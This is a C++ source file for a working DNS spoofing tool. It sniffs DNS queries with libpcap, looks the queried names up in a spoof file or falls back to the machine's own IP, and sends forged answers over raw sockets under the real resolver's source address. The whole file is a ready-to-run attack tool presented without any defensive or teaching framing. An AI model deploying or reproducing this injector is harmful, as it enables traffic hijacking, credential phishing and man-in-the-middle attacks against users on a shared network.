#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <resolv.h>
#include <map>
#include <string>
#include <algorithm>
#include <sys/ioctl.h>
#include <net/if.h>

#include "dns_common.hpp"

using namespace std;		

std::map<string, string> inject_hosts;
string local_ip = "";

void get_local_ip(char *array)
{
	int n;
    struct ifreq ifr;
 
    n = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , array , IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    local_ip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
}

void send_packet(char* ip, u_int16_t port, char* packet, int packlen) {
	int sock = -1;
	
	if (0 > (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))) {
		fprintf(stderr, "Error creating socket");
		return;
	}

	struct sockaddr_in to_addr;

	to_addr.sin_family 	= AF_INET;
	to_addr.sin_port 	= htons(port);
	to_addr.sin_addr.s_addr = inet_addr(ip);
	
	const int val = 1;

	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val)) < 0){
		fprintf(stderr, "Error at setsockopt()");
		return;
	}
	
	int bytes_sent = -1;

	if(0 > (bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr,
		sizeof(to_addr))))
		fprintf(stderr, "Error sending data");
}

void get_ip(struct iphdr *ip, char* src_ip, char* dst_ip){
	
	struct sockaddr_in source,dest;
	memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = ip->saddr;
     
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = ip->daddr;
    strcpy(src_ip, inet_ntoa(source.sin_addr));
    strcpy(dst_ip, inet_ntoa(dest.sin_addr));
}

 struct DNS_header * get_dns_header(const u_char *packet,
				char* src_ip, char* dst_ip, u_int16_t *port){

	struct Ether_header * ether = (struct Ether_header*)(packet);

	struct iphdr * ip = (struct iphdr*)(((char*) ether) + ETHER_HDR_SIZE);
	unsigned int  ip_header_size = ip->ihl * 4;

	get_ip(ip, src_ip, dst_ip);
	
	struct udphdr * udp = (struct udphdr *)(((char*) ip) + ip_header_size);
	
	*port = ntohs((*(u_int16_t*)udp));

	struct DNS_header * dns_hdr = (struct DNS_header*)(((char*) udp) + UDP_HDR_SIZE);

	return dns_hdr;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, 
			const u_char *packet){

	unsigned int i = 1, j = 0, k;
	unsigned int size;

	char response_packet[200];
	
	memset(response_packet, 0, 200);

	char src_ip[IP_SIZE];
	char dst_ip[IP_SIZE];
	u_int16_t port;

	struct DNS_header *dns_hdr = get_dns_header(packet, src_ip, dst_ip, &port);

	char *curr = ((char*) dns_hdr) + DNS_HDR_SIZE;

	char request[100];

	struct DNS_question * question = (struct DNS_question *)(((char *)(curr)) + strlen(curr) + 1);

	if (ntohs(question->q_class) != 1) {
		fprintf(stderr, "Improper class, returning\n");
	}

	for (size = curr[0]; (size > 0); size = curr[i++]) {
		for(k = 0; k < size; k++)
			request[j++] = curr[i + k];
		
		request[j++] = '.';
		i += size;
	}

	request[--j] = '\0';

	struct sockaddr_in sa;

	if (inject_hosts.find(request) != inject_hosts.end())
		inet_pton(AF_INET, inject_hosts[request].c_str(), &(sa.sin_addr));		
	else if (local_ip != "")
		inet_pton(AF_INET, local_ip.c_str(), &(sa.sin_addr));
	else
		return;

	unsigned int response_size = strlen(request) + 2;
	char* response = response_packet + IP_HDR_SIZE + UDP_HDR_SIZE;
	
	struct DNS_question *dns_query = (struct DNS_question*)(((char*) dns_hdr) + DNS_HDR_SIZE);
	
	memcpy(&response[0], &(dns_hdr->id), 2);

	memcpy(&response[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
	
	memcpy(&response[12], dns_query, response_size);
	response_size = response_size + 12;
	
	memcpy(&response[response_size], "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 16);
	response_size = response_size + 16;
	
	memcpy(&response[response_size], &(sa.sin_addr), 4);
	response_size  = response_size + 4;

	unsigned int  response_packet_size = response_size;

	struct ip *ip_hdr = (struct ip *) response_packet;
	struct udphdr *udp_hdr = (struct udphdr *) (response_packet + IP_HDR_SIZE);
	
	ip_hdr->ip_p 	= 17;
	
	ip_hdr->ip_src.s_addr = inet_addr(dst_ip);
	ip_hdr->ip_dst.s_addr = inet_addr(src_ip);
	
	udp_hdr->source = htons(53);
	udp_hdr->dest 	= htons(port);

	ip_hdr->ip_len 	= IP_HDR_SIZE + UDP_HDR_SIZE + response_packet_size;
	udp_hdr->len 	= htons(UDP_HDR_SIZE + response_packet_size);
	
	ip_hdr->ip_ttl 	= 200;
	ip_hdr->ip_hl 	= 5;
	ip_hdr->ip_v 	= 4;

	response_packet_size += (IP_HDR_SIZE + UDP_HDR_SIZE);
	
	send_packet(src_ip, port, response_packet, response_packet_size);

	printf("%s made a request for domain %s\n", src_ip, request);
}

void fill_hosts(char * spoof_file) {
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;

	fp = fopen(spoof_file, "r");
	if (fp == NULL)
			exit(EXIT_FAILURE);

	int i = 0;
	while ((read = getline(&line, &len, fp)) != -1) {
		char * pch;
		pch = strtok (line, " \t");
		while (pch != NULL) {
			string ip = pch;
			pch = strtok (NULL, " \t");
			string hostname = pch;
			hostname.erase(std::remove(hostname.begin(), hostname.end(), '\n'),
						hostname.end());

			pch = strtok (NULL, " \t");
			inject_hosts.insert(pair<string, string> (hostname, ip));
		}
	}

	fclose(fp);
}

int main(int argc, char **argv){
	
	string filter;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	pcap_t *descr;
	string expression = "";

	int c;
	char *spoof_file = NULL;
	char *dev = NULL;	 
	
    bpf_u_int32 maskp;
    bpf_u_int32 netp;

	while ((c = getopt (argc, argv, "i:f:h?")) != -1) {
		switch(c) {
			case 'i':
					dev = optarg;
					break;
			case 'f':
					spoof_file = (char *)malloc(256);
					memset(spoof_file, 0, 256);
					strcpy(spoof_file, optarg);
					break;
			default:
					printf("Wrong Usage\n");	
					break;
		}
	}
	
	if (argc > optind)
		expression = argv[optind];

	if (NULL == dev)
        dev = pcap_lookupdev(errbuf);

    if(dev == NULL) {
        fprintf(stderr, "%s\n", errbuf);
        exit(1);
    }

	printf("Device - %s\n", dev);

	if (spoof_file)
		fill_hosts(spoof_file);
	else
		get_local_ip(dev);

	IP_HDR_SIZE 	=  sizeof(struct ip);
	UDP_HDR_SIZE 	=  sizeof(struct udphdr);
	DNS_HDR_SIZE	=  sizeof(struct DNS_header);
	ETHER_HDR_SIZE	=  sizeof(struct Ether_header);

	printf("Initializing\n");
	
	for (std::map<string,string>::iterator it=inject_hosts.begin();
						it!= inject_hosts.end(); ++it)
		std::cout << it->first << " -> " << it->second << '\n';
	
	if (expression == "")
		filter = "udp and dst port domain";
	else
		filter = "udp and dst port domain and " + expression;

	memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    
    pcap_lookupnet(dev, &netp, &maskp, errbuf);

	descr = pcap_open_live(dev, 1500, 1, 0,errbuf);

	if (descr == NULL) {
		fprintf (stderr, "%s", errbuf);
		return 0;
	}

	if( 0 > pcap_compile(descr, &fp, filter.c_str(), 0, 0)){
		fprintf(stderr, "Couldn't parse filter %s\n", filter);
		return 0;
	}
	
	if (0 > pcap_setfilter(descr, &fp)) {
		fprintf(stderr, "Couldn't install filter %s\n", filter);
		return 0;
	}
	
	pcap_loop(descr, -1, got_packet, NULL);
	
	pcap_close(descr);
	
	return 0;
}